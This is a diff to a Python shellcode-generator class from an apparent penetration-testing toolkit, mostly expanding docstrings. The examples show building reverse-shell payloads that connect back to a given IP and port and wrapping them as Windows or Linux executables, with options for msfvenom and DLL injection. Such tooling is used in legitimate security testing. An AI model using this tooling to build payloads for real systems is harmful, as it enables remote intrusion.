@@ -14,18 +14,42 @@ logger = logging.getLogger(settings.app_branding)
 
 
 class ShellGenerator:
-    """Shellcode generation with custom template registry"""
+    """Flexible shellcode generator with custom template support.
 
-    # Class-level template registry for custom shellcode templates
+    Generates shellcode using built-in templates or custom user-provided templates.
+    Supports Linux/Windows on x86/x64 with reverse/bind shell capabilities.
+    Can optionally wrap shellcode in executable formats (PE/ELF).
+
+    Attributes:
+        OS_TARGET: Target operating system ('LINUX', 'WINDOWS')
+        OS_TARGET_ARCH: Target architecture ('X86', 'X64')
+        _custom_templates: Class-level registry of custom shellcode templates
+
+    Example:
+        >>> gen = ShellGenerator('linux', 'x64')
+        >>> sc, exe_path = gen.get_shellcode(
+        ...     shellcode_type='reverse',
+        ...     connectback_ip='192.168.1.100',
+        ...     connectback_port=4444
+        ... )
+        >>> len(sc)
+        87
+
+        Custom template example:
+        >>> def my_shell(ip: str, port: int) -> bytes:
+        ...     return b'\x90' * 10  # NOP sled
+        >>> ShellGenerator.register_template('linux', 'x64', 'custom', my_shell)
+        >>> gen.get_shellcode('custom', '127.0.0.1', 5555)
+    """
+
     _custom_templates: dict[str, Callable[[str, int], bytes] | bytes] = {}
 
     def __init__(self, os_target: str, os_target_arch: str):
-        """
-        Initialize shellcode generator.
+        """Initialize shellcode generator for specific platform.
 
         Args:
-            os_target: Target OS (linux, windows)
-            os_target_arch: Target architecture (x86, x64)
+            os_target: Target OS ('linux', 'windows')
+            os_target_arch: Target architecture ('x86', 'x64')
         """
         self.OS_TARGET = os_target.upper()
         self.OS_TARGET_ARCH = os_target_arch.upper()
@@ -141,22 +165,41 @@ class ShellGenerator:
         shell_args: dict | None = None,
         use_precompiled: bool = True,
     ) -> tuple[bytes, str]:
-        """
-        Generate shellcode.
+        """Generate shellcode with optional executable wrapping.
+
+        Generates raw shellcode bytes and optionally wraps them in a
+        platform-appropriate executable (PE for Windows, ELF for Linux).
 
         Args:
-            shellcode_type: Type of shellcode (reverse, bind, custom)
-            connectback_ip: IP address for connection
-            connectback_port: Port for connection
-            make_exe: Whether to create executable (1) or not (0)
-            debug: Enable debug output (1) or not (0)
-            filename: Output filename for executable
-            dll_inj_funcs: DLL injection functions (Windows)
-            shell_args: Additional shell arguments
-            use_precompiled: Use precompiled shellcode if available
+            shellcode_type: Type of shellcode ('reverse', 'bind', or custom registered type)
+            connectback_ip: IP address for reverse shell connection
+            connectback_port: Port number for shell connection
+            make_exe: Create executable file (1) or return raw bytes only (0)
+            debug: Log debug information including hex dump (1) or silent (0)
+            filename: Base filename for executable (extension added automatically)
+            dll_inj_funcs: DLL injection function names for Windows executables
+            shell_args: Additional shellcode arguments (reserved for future use)
+            use_precompiled: Use precompiled templates vs Docker assembly (True recommended)
 
         Returns:
-            Tuple of (shellcode_bytes, executable_filepath)
+            Tuple of (raw_shellcode_bytes, executable_path)
+            - If make_exe=0: Returns (shellcode, "")
+            - If make_exe=1: Returns (shellcode, "/path/to/executable")
+
+        Raises:
+            ValueError: If IP/port invalid or shellcode type not supported
+
+        Example:
+            >>> gen = ShellGenerator('windows', 'x86')
+            >>> sc, exe = gen.get_shellcode(
+            ...     shellcode_type='reverse',
+            ...     connectback_ip='192.168.1.100',
+            ...     connectback_port=4444,
+            ...     make_exe=1,
+            ...     filename='payload'
+            ... )
+            >>> exe
+            '/home/user/.local/share/ofx/tmp/payload.exe'
         """
         dll_inj_funcs = dll_inj_funcs or []
         shell_args = shell_args or {}
@@ -191,18 +234,22 @@ class ShellGenerator:
         return shellcode, filepath
 
     def _generate_shellcode(self, shellcode_type: str, ip: str, port: int) -> bytes:
-        """
-        Generate shellcode from templates.
+        """Generate raw shellcode from templates.
+
+        Checks custom templates first, then falls back to built-in templates.
+        Uses msfvenom or Docker assembly compilation depending on availability.
 
         Args:
-            shellcode_type: Type of shellcode
-            ip: IP address
-            port: Port number
+            shellcode_type: Type of shellcode to generate
+            ip: IP address for connection
+            port: Port number for connection
 
         Returns:
             Raw shellcode bytes
+
+        Raises:
+            ValueError: If no template exists for the requested combination
         """
-        # Check for custom template first
         custom_template = self._get_custom_template(shellcode_type)
         if custom_template is not None:
             if callable(custom_template):
@@ -211,11 +258,9 @@ class ShellGenerator:
                 )
                 return custom_template(ip, port)
             else:
-                # Raw bytes template
                 logger.info("Using custom raw bytes template")
                 return custom_template
 
-        # Fall back to built-in templates
         try:
             template_func = SHELLCODE_TEMPLATES[self.OS_TARGET][self.OS_TARGET_ARCH][
                 shellcode_type
